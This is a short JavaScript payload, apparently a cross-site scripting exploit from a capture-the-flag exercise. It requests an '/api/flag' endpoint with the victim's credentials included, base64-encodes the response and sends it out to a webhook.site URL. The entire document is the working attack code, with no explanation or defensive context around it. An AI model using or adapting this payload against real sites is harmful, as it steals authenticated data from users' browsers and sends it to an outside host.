fetch('http://167.71.234.203:3000/api/flag', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://webhook.site/c779cb56-ae2a-47ac-b232-97c764ceb453/?d='+btoa(d)));
